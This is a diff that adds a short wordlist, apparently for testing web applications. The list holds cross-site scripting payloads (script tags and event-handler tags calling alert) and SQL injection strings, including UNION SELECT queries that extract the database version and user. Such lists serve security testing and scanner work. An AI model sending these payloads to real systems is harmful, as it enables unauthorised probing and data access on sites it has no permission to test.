@@ -1,0 +1,17 @@
+hello
+<script>alert(1)</script>
+<script>alert('XSS1')</script>
+<script>alert('XSS2')</script>
+<img src=x onerror=alert('XSS3')>
+' OR 1=1 --
+%' or 0=0 union select null, version() #
+%' or 0=0 union select null, user() #
+' union (select @@version) --
+' union (select NULL, (select @@version)) --
+' union (select NULL, NULL, (select @@version)) --
+' union (select NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  (select @@version)) --
+</script><svg onload=alert(1)>
+<x contenteditable onblur=alert(1)>lose focus!
+<x onclick=alert(1)>click this!
+<x oncopy=alert(1)>copy this!
